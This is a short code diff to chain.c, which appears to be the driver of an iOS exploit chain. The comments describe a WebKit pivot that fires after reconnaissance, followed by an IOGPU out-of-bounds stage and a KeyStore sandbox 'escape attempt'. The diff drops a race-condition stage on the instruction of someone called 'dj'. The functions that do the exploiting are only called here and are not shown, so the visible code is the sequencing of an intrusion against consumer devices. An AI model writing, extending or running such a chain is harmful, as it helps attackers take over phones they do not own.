@@ -1,7 +1,7 @@
-/* chain.c — dj's order v3: WebKit pivot runs FIRST (auto, fired by the
-   UIBridge gate on WPROBE3 = recon complete). This native chain fires only
-   after that. (1) IOGPU OOB fast lane, (2) escape attempt = KeyStore
-   s17/s35 grid, (3) race lanes. Continuous chain log. */
+/* chain.c — dj's order v4: WebKit pivot completes FIRST (auto, fired by
+   the UIBridge gate on "RECON COMPLETE" only). Then this chain runs:
+   (1) IOGPU OOB 24257 struct sweep, (2) escape attempt = KeyStore s17/s35.
+   Race lane REMOVED per dj — not part of the chain. Continuous log. */
 #include <stdio.h>
 #include <stdint.h>
 #include <unistd.h>
@@ -9,16 +9,13 @@
 
 void nk_chain_run(void) {
     nk_filelog_open("chain");
-    nk_log("[gen] stage 0: IOGPU OOB fast lane (direct)");
+    nk_log("[gen] chain start cause (see GEN line in trace.log)");
+    nk_log("[gen] stage 0: IOGPU OOB 24257");
     nk_iogpu_oob_run();
     nk_filelog_reopen_kind("chain");
     nk_log("[gen] stage 0 done -> stage 1: escape (KeyStore s17/s35)");
     nk_ksmagic_run();
     nk_filelog_reopen_kind("chain");
-    nk_log("[esc] stage 1 done -> stage 2: race");
-    fflush(stdout);
-    nk_racer_run();
-    nk_filelog_reopen_kind("chain");
-    nk_log("[gen] stage 2 done -> chain end");
+    nk_log("[gen] chain end");
     nk_filelog_close();
 }
